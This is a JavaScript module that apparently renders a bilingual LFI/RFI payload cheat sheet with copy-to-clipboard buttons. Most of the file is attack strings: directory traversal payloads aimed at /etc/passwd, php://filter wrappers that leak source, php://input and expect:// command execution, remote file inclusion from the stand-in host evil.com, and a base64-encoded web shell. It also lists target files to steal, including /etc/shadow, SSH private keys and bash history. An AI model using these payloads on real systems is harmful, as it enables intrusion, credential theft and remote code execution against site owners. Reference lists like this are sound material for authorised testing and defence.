const categories = {
  'Directory Traversal': [
    { label: 'Basic (Linux)', payload: '../../../etc/passwd' },
    { label: 'Basic (Windows)', payload: '..\\..\\..\\windows\\win.ini' },
    { label: 'Double encoding', payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd' },
    { label: 'URL encoded', payload: '..%2F..%2F..%2Fetc%2Fpasswd' },
    { label: '16-bit unicode', payload: '..%252f..%252f..%252fetc/passwd' },
    { label: 'Null byte (old)', payload: '../../../etc/passwd%00' },
    { label: 'Dots only', payload: '....//....//....//etc/passwd' },
    { label: 'Double dot slash', payload: '../.../...//etc/passwd' },
    { label: 'Path truncation', payload: '../../../etc/passwd......................' },
    { label: 'File by wrapper', payload: 'file:///etc/passwd' },
  ],
  'PHP Wrapper (file)': [
    { label: 'php://filter base64', payload: 'php://filter/convert.base64-encode/resource=index.php' },
    { label: 'php://filter rot13', payload: 'php://filter/read=string.rot13/resource=index.php' },
    { label: 'php://filter chain', payload: 'php://filter/convert.base64-encode|convert.base64-encode/resource=index.php' },
    { label: 'php://filter zip', payload: 'php://filter/zlib.deflate/convert.base64-encode/resource=index.php' },
    { label: 'php://filter strings', payload: 'php://filter/read=convert.iconv.utf-8.utf-7/resource=index.php' },
  ],
  'PHP Wrapper (filter)': [
    { label: 'php://filter read', payload: 'php://filter/read=convert.base64-encode/resource=config.php' },
    { label: 'php://filter + b64', payload: 'php://filter/convert.base64-encode/resource=../../../../etc/passwd' },
    { label: 'php://filter nested', payload: 'php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=index.php' },
    { label: 'php://input', payload: 'php://input (POST: <?php system("id");?>)' },
    { label: 'expect://', payload: 'expect://id' },
  ],
  'PHP RFI': [
    { label: 'Basic RFI', payload: 'http://evil.com/shell.txt?' },
    { label: 'RFI with null byte', payload: 'http://evil.com/shell.txt%00' },
    { label: 'RFI with query', payload: 'http://evil.com/shell.php?cmd=ls' },
    { label: 'RFI data://', payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D' },
    { label: 'RFI php://input', payload: 'php://input (POST: <?php system($_GET["c"]);?>)' },
    { label: 'RFI with wrapper', payload: 'php://filter/convert.base64-encode/resource=http://evil.com/shell.txt' },
  ],
};

const usefulFiles = [
  { os: 'Linux', files: ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname', '/etc/issue', '/etc/os-release', '/etc/ssh/sshd_config', '/root/.bash_history', '/root/.ssh/id_rsa', '/home/*/.ssh/id_rsa', '/proc/self/environ', '/proc/self/fd/0', '/proc/self/fd/1', '/proc/self/cmdline', '/proc/version'] },
  { os: 'Apache', files: ['/etc/apache2/apache2.conf', '/etc/apache2/sites-available/000-default.conf', '/etc/httpd/conf/httpd.conf', '/var/log/apache2/access.log', '/var/log/apache2/error.log'] },
  { os: 'MySQL', files: ['/etc/mysql/my.cnf', '/var/lib/mysql/mysql/user.MYD', '/var/log/mysql/error.log'] },
  { os: 'Windows', files: ['C:\\boot.ini', 'C:\\Windows\\win.ini', 'C:\\Windows\\system32\\drivers\\etc\\hosts', 'C:\\Windows\\System32\\eula.txt', 'C:\\inetpub\\wwwroot\\web.config', 'C:\\xampp\\apache\\conf\\httpd.conf', 'C:\\xampp\\mysql\\bin\\my.ini'] },
];

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function osClass(os) {
  return os.toLowerCase().replace(/[^a-z0-9]/g, '-');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  const catNames = Object.keys(categories);
  return `
<div class="section-title">${isFa ? 'پیلودهای LFI/RFI' : 'LFI/RFI Payloads'}</div>
<div class="tabs" id="lfi-tabs">
  ${catNames.map((c, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="lfi-${i}">${c}</button>`).join('')}
</div>
${catNames.map((c, i) => `
<div class="tab-pane${i === 0 ? ' active' : ''}" id="lfi-${i}">
  ${categories[c].map(p => `
  <div class="panel" style="padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
    <pre style="flex:1;margin:0;overflow:auto"><code>${escapeHtml(p.payload)}</code></pre>
    <button class="secondary-btn" data-copy="${escapeHtml(p.payload)}" style="flex-shrink:0">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}
<div class="section-title" style="margin-top:20px">${isFa ? 'فایل‌های مفید' : 'Useful Files'}</div>
<div class="grid two">
${usefulFiles.map(g => `
<div class="panel">
  <h4 style="margin:0 0 10px"><span class="chip ${osClass(g.os)}">${g.os}</span></h4>
  ${g.files.map(f => `
  <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
    <code style="flex:1">${escapeHtml(f)}</code>
    <button class="secondary-btn" data-copy="${escapeHtml(f)}">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}
</div>`;
}

export function init(lang) {
  const container = document.getElementById('content');
  container.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn && btn.hasAttribute('data-copy')) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
    const tab = e.target.closest('.tab');
    if (tab && tab.closest('#lfi-tabs')) {
      container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const pane = document.getElementById(tab.getAttribute('data-tab'));
      if (pane) pane.classList.add('active');
    }
  });
}
